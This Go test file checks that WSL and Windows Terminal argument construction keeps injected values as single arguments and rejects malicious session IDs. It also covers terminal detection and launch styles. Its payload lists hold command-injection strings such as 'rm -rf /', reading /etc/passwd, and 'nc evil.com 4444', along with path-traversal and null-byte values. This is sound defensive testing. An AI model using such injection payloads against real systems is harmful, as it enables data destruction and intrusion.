//go:build !windows

package platform

import (
	"os"
	"os/exec"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// Security: Command injection via WSL_DISTRO_NAME
// ---------------------------------------------------------------------------

func TestBuildWSLWTArgs_MaliciousDistroName(t *testing.T) {
	// WSL_DISTRO_NAME comes from the environment. A malicious distro name
	// must remain a single argument to -d (exec.Command does not interpret
	// shell metacharacters, but we verify the arg list structure is correct).
	payloads := []string{
		"; rm -rf /",
		"&& cat /etc/passwd",
		"$(whoami)",
		"`id`",
		"Ubuntu; nc evil.com 4444",
		"distro\nnewline",
		"distro\x00null",
		"--help",
		"-d evil --",
	}

	shell := ShellInfo{Name: "bash", Path: "/bin/bash"}
	for _, distro := range payloads {
		t.Run(truncateForTestName(distro), func(t *testing.T) {
			args := buildWSLWTArgs(shell, "echo test", "", distro, "", "")

			// Find the -d flag position.
			dIdx := -1
			for i, a := range args {
				if a == "-d" {
					dIdx = i
					break
				}
			}
			if dIdx == -1 || dIdx+1 >= len(args) {
				t.Fatal("-d flag not found in args")
			}

			// The distro name must be a single unsplit argument.
			if args[dIdx+1] != distro {
				t.Errorf("distro arg = %q, want %q (must not be split)", args[dIdx+1], distro)
			}

			// Verify the overall structure: nothing from the distro
			// "leaked" into other argument positions.
			wslIdx := -1
			for i, a := range args {
				if a == "wsl.exe" {
					wslIdx = i
					break
				}
			}
			if wslIdx == -1 {
				t.Fatal("wsl.exe not found in args")
			}
			// After wsl.exe: -d, <distro>, --, <shell>, -c, <resumeCmd>
			expected := []string{"wsl.exe", "-d", distro, "--", shell.Path, "-c", "echo test"}
			tail := args[wslIdx:]
			if len(tail) != len(expected) {
				t.Fatalf("tail args len = %d, want %d; got %v", len(tail), len(expected), tail)
			}
			for i, want := range expected {
				if tail[i] != want {
					t.Errorf("tail[%d] = %q, want %q", i, tail[i], want)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Security: Command injection via shell.Path
// ---------------------------------------------------------------------------

func TestBuildWSLWTArgs_MaliciousShellPath(t *testing.T) {
	// shell.Path becomes a single argument after "--". Even if it contains
	// shell metacharacters, exec.Command treats it as one argv element.
	payloads := []string{
		"/bin/bash; rm -rf /",
		"/bin/$(whoami)",
		"/bin/`id`",
		"/bin/bash\x00--extra",
		"/bin/bash\n-c\nrm -rf /",
	}

	for _, path := range payloads {
		t.Run(truncateForTestName(path), func(t *testing.T) {
			shell := ShellInfo{Name: "evil", Path: path}
			args := buildWSLWTArgs(shell, "echo test", "", "Ubuntu", "", "")

			// Find -- separator.
			sepIdx := -1
			for i, a := range args {
				if a == "--" {
					sepIdx = i
					break
				}
			}
			if sepIdx == -1 || sepIdx+1 >= len(args) {
				t.Fatal("-- separator not found in args")
			}

			// The shell path must appear as a single argument immediately after --.
			if args[sepIdx+1] != path {
				t.Errorf("shell path = %q, want %q (must be single arg)", args[sepIdx+1], path)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Security: Path traversal via wslpath output (malicious Windows path)
// ---------------------------------------------------------------------------

func TestBuildWSLWTArgs_MaliciousWindowsPath(t *testing.T) {
	// If wslpath returns a malicious Windows path, it becomes
	// a single --startingDirectory argument. Verify it stays as one arg.
	payloads := []string{
		`..\..\..\..\Windows\System32`,
		`C:\Users\evil" --startingDirectory "C:\other`,
		`\\evil-server\share`,
		`C:\path; rm -rf \`,
		"C:\\path\x00null",
	}

	shell := ShellInfo{Name: "bash", Path: "/bin/bash"}
	for _, winPath := range payloads {
		t.Run(truncateForTestName(winPath), func(t *testing.T) {
			args := buildWSLWTArgs(shell, "echo test", winPath, "Ubuntu", "", "")

			// Find --startingDirectory flag.
			sdIdx := -1
			for i, a := range args {
				if a == "--startingDirectory" {
					sdIdx = i
					break
				}
			}
			if sdIdx == -1 || sdIdx+1 >= len(args) {
				t.Fatal("--startingDirectory not found in args")
			}

			// Path must be a single unsplit argument.
			if args[sdIdx+1] != winPath {
				t.Errorf("startingDirectory arg = %q, want %q", args[sdIdx+1], winPath)
			}

			// Verify no extra --startingDirectory flags were injected.
			count := 0
			for _, a := range args {
				if a == "--startingDirectory" {
					count++
				}
			}
			if count != 1 {
				t.Errorf("expected exactly 1 --startingDirectory, got %d in %v", count, args)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Security: Empty/missing WSL_DISTRO_NAME handling
// ---------------------------------------------------------------------------

func TestBuildWSLWTArgs_EmptyDistro(t *testing.T) {
	shell := ShellInfo{Name: "bash", Path: "/bin/bash"}
	args := buildWSLWTArgs(shell, "echo test", "", "", "", "")

	// With empty distro, -d flag must NOT appear.
	for _, a := range args {
		if a == "-d" {
			t.Error("-d flag should not appear when distro is empty")
		}
	}

	// Should still have wsl.exe -- <shell> -c <cmd>
	wslIdx := -1
	for i, a := range args {
		if a == "wsl.exe" {
			wslIdx = i
			break
		}
	}
	if wslIdx == -1 {
		t.Fatal("wsl.exe not found in args")
	}
	tail := args[wslIdx:]
	expected := []string{"wsl.exe", "--", shell.Path, "-c", "echo test"}
	if len(tail) != len(expected) {
		t.Fatalf("tail len = %d, want %d; got %v", len(tail), len(expected), tail)
	}
	for i, want := range expected {
		if tail[i] != want {
			t.Errorf("tail[%d] = %q, want %q", i, tail[i], want)
		}
	}
}

// ---------------------------------------------------------------------------
// Security: wslpath failure handling
// ---------------------------------------------------------------------------

func TestBuildWSLWTArgs_EmptyWinCwd(t *testing.T) {
	// When wslpath fails (returns empty string), --startingDirectory
	// must not appear in the argument list.
	shell := ShellInfo{Name: "bash", Path: "/bin/bash"}
	args := buildWSLWTArgs(shell, "echo test", "", "Ubuntu", "", "")

	for _, a := range args {
		if a == "--startingDirectory" {
			t.Error("--startingDirectory should not appear when winCwd is empty")
		}
	}
}

func TestWslToWindowsPath_EmptyPath(t *testing.T) {
	skipUnlessWSL(t)

	_, err := wslToWindowsPath("")
	// wslpath with empty string may error or return empty — either is safe.
	// The key property is that it does not return a dangerous path.
	if err == nil {
		// If no error, result must be benign (empty or valid path).
		t.Log("wslpath accepted empty path (benign)")
	}
}

// ---------------------------------------------------------------------------
// Security: Null byte injection in WSL args
// ---------------------------------------------------------------------------

func TestBuildWSLWTArgs_NullByteInAllInputs(t *testing.T) {
	// Verify null bytes in any input don't cause argument splitting or
	// unexpected behavior in the args array.
	shell := ShellInfo{Name: "bash", Path: "/bin/bash\x00evil"}
	args := buildWSLWTArgs(shell, "echo\x00injected", "C:\\path\x00evil", "Ubuntu\x00evil", "", "")

	// The args are passed through as-is (Go's exec.Command handles
	// null bytes at the OS level). Verify the structure is still correct.
	wslIdx := -1
	for i, a := range args {
		if a == "wsl.exe" {
			wslIdx = i
			break
		}
	}
	if wslIdx == -1 {
		t.Fatal("wsl.exe not found in args")
	}

	// After wsl.exe: -d, <distro>, --, <shell>, -c, <resumeCmd>
	tail := args[wslIdx:]
	if len(tail) != 7 {
		t.Fatalf("expected 7 elements after wsl.exe index, got %d: %v", len(tail), tail)
	}
	if tail[0] != "wsl.exe" || tail[1] != "-d" || tail[3] != "--" || tail[5] != "-c" {
		t.Errorf("unexpected structure: %v", tail)
	}
}

// ---------------------------------------------------------------------------
// Security: validateSessionID blocks malicious session IDs
// (verifying WSL launch path also benefits from session ID validation)
// ---------------------------------------------------------------------------

func TestValidateSessionID_WSLInjectionPayloads(t *testing.T) {
	// Verify that session IDs that could be dangerous in a WSL context
	// are rejected by validateSessionID.
	payloads := []string{
		"; wsl.exe -d evil",
		"&& wt.exe --help",
		"$(wslpath -w /etc/passwd)",
		"`wslpath -w /`",
		"--startingDirectory C:\\evil",
		"-d evil-distro",
		"sess\x00--extra",
		"sess id with spaces",
		"../../etc/passwd",
	}

	for _, payload := range payloads {
		t.Run(truncateForTestName(payload), func(t *testing.T) {
			err := validateSessionID(payload)
			if err == nil {
				t.Errorf("validateSessionID should reject %q", payload)
			}
		})
	}
}

// skipUnlessWSL skips the test when not running inside WSL.
func skipUnlessWSL(t *testing.T) {
	t.Helper()
	if !isWSL() {
		t.Skip("test requires WSL environment")
	}
}

// skipUnlessWSLWithWT skips when not in WSL or wt.exe is not on PATH.
func skipUnlessWSLWithWT(t *testing.T) {
	t.Helper()
	skipUnlessWSL(t)
	if _, err := exec.LookPath("wt.exe"); err != nil {
		t.Skip("test requires wt.exe on PATH (Windows Terminal)")
	}
}

// ---------------------------------------------------------------------------
// detectLinuxTerminals — WSL awareness
// ---------------------------------------------------------------------------

func TestDetectLinuxTerminals_WSL_IncludesWindowsTerminal(t *testing.T) {
	skipUnlessWSLWithWT(t)

	terms := detectLinuxTerminals()
	found := false
	for _, ti := range terms {
		if ti.Name == termWindowsTerminal {
			found = true
			break
		}
	}
	if !found {
		t.Error("detectLinuxTerminals() in WSL with wt.exe should include Windows Terminal")
	}
}

func TestDetectLinuxTerminals_WSL_WindowsTerminalFirst(t *testing.T) {
	skipUnlessWSLWithWT(t)

	terms := detectLinuxTerminals()
	if len(terms) == 0 {
		t.Fatal("detectLinuxTerminals() returned no terminals in WSL")
	}
	if terms[0].Name != termWindowsTerminal {
		t.Errorf("detectLinuxTerminals() first entry = %q; want %q", terms[0].Name, termWindowsTerminal)
	}
}

// ---------------------------------------------------------------------------
// DefaultTerminal — WSL awareness
// ---------------------------------------------------------------------------

func TestDefaultTerminal_WSL_PrefersWindowsTerminal(t *testing.T) {
	skipUnlessWSLWithWT(t)

	term := DefaultTerminal()
	if term != termWindowsTerminal {
		t.Errorf("DefaultTerminal() in WSL = %q; want %q", term, termWindowsTerminal)
	}
}

// ---------------------------------------------------------------------------
// DetectTerminals — WSL awareness (public API)
// ---------------------------------------------------------------------------

func TestDetectTerminals_WSL_NonEmpty(t *testing.T) {
	skipUnlessWSLWithWT(t)

	terms := DetectTerminals()
	if len(terms) == 0 {
		t.Fatal("DetectTerminals() returned no terminals in WSL")
	}
}

func TestDetectTerminals_WSL_IncludesWindowsTerminal(t *testing.T) {
	skipUnlessWSLWithWT(t)

	terms := DetectTerminals()
	found := false
	for _, ti := range terms {
		if ti.Name == termWindowsTerminal {
			found = true
			break
		}
	}
	if !found {
		t.Error("DetectTerminals() in WSL with wt.exe should include Windows Terminal")
	}
}

// ---------------------------------------------------------------------------
// wslToWindowsPath
// ---------------------------------------------------------------------------

func TestWslToWindowsPath(t *testing.T) {
	skipUnlessWSL(t)

	winPath, err := wslToWindowsPath("/mnt/c/Users")
	if err != nil {
		t.Fatalf("wslToWindowsPath(/mnt/c/Users) error: %v", err)
	}
	if !strings.HasPrefix(winPath, "C:\\") {
		t.Errorf("wslToWindowsPath(/mnt/c/Users) = %q; want prefix C:\\", winPath)
	}
}

func TestWslToWindowsPath_HomePath(t *testing.T) {
	skipUnlessWSL(t)

	home, err := os.UserHomeDir()
	if err != nil {
		t.Skipf("cannot determine home directory: %v", err)
	}

	winPath, pathErr := wslToWindowsPath(home)
	if pathErr != nil {
		t.Fatalf("wslToWindowsPath(%q) error: %v", home, pathErr)
	}
	// wslpath should return a path containing a backslash (Windows path)
	// or a \\wsl.localhost\ prefix for WSL-native paths.
	if winPath == "" {
		t.Errorf("wslToWindowsPath(%q) returned empty string", home)
	}
}

// ---------------------------------------------------------------------------
// launchWSLWindowsTerminal argument construction — launch styles
// ---------------------------------------------------------------------------

// TestBuildWSLWTArgs_TabMode verifies that the WSL Windows Terminal launch
// constructs correct wt.exe arguments for tab mode (default).
func TestBuildWSLWTArgs_TabMode(t *testing.T) {
	skipUnlessWSLWithWT(t)

	shell := ShellInfo{Name: "bash", Path: "/bin/bash"}
	err := launchLinuxSession(shell, "echo test", termWindowsTerminal, "", "", "")
	if err != nil && strings.Contains(err.Error(), "no supported terminal emulator found") {
		t.Error("launchLinuxSession with Windows Terminal in WSL fell through to 'no terminal' error")
	}
}

func TestBuildWSLWTArgs_LaunchStyles(t *testing.T) {
	shell := ShellInfo{Name: "bash", Path: "/bin/bash"}

	tests := []struct {
		name          string
		launchStyle   string
		paneDirection string
		wantPrefix    []string
	}{
		{"default_tab", "", "", []string{"-w", "0", "new-tab"}},
		{"explicit_tab", LaunchStyleTab, "", []string{"-w", "0", "new-tab"}},
		{"window", LaunchStyleWindow, "", []string{"-w", "new", "new-tab"}},
		{"pane_auto", LaunchStylePane, "auto", []string{"-w", "0", "split-pane"}},
		{"pane_right", LaunchStylePane, "right", []string{"-w", "0", "split-pane", "-V"}},
		{"pane_down", LaunchStylePane, "down", []string{"-w", "0", "split-pane", "-H"}},
		{"pane_left", LaunchStylePane, "left", []string{"-w", "0", "split-pane", "-V"}},
		{"pane_up", LaunchStylePane, "up", []string{"-w", "0", "split-pane", "-H"}},
		{"pane_empty_dir", LaunchStylePane, "", []string{"-w", "0", "split-pane"}},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			args := buildWSLWTArgs(shell, "echo test", "", "Ubuntu", tc.launchStyle, tc.paneDirection)

			// Verify the args start with the expected prefix.
			if len(args) < len(tc.wantPrefix) {
				t.Fatalf("args too short: got %v, want prefix %v", args, tc.wantPrefix)
			}
			for i, want := range tc.wantPrefix {
				if args[i] != want {
					t.Errorf("args[%d] = %q, want %q (full: %v)", i, args[i], want, args)
				}
			}
		})
	}
}

func TestBuildWSLWTArgs_WithCwd(t *testing.T) {
	shell := ShellInfo{Name: "bash", Path: "/bin/bash"}
	args := buildWSLWTArgs(shell, "echo test", `C:\Users\test`, "Ubuntu", "", "")

	sdIdx := -1
	for i, a := range args {
		if a == "--startingDirectory" {
			sdIdx = i
			break
		}
	}
	if sdIdx == -1 || sdIdx+1 >= len(args) {
		t.Fatal("--startingDirectory not found in args")
	}
	if args[sdIdx+1] != `C:\Users\test` {
		t.Errorf("startingDirectory = %q, want %q", args[sdIdx+1], `C:\Users\test`)
	}
}
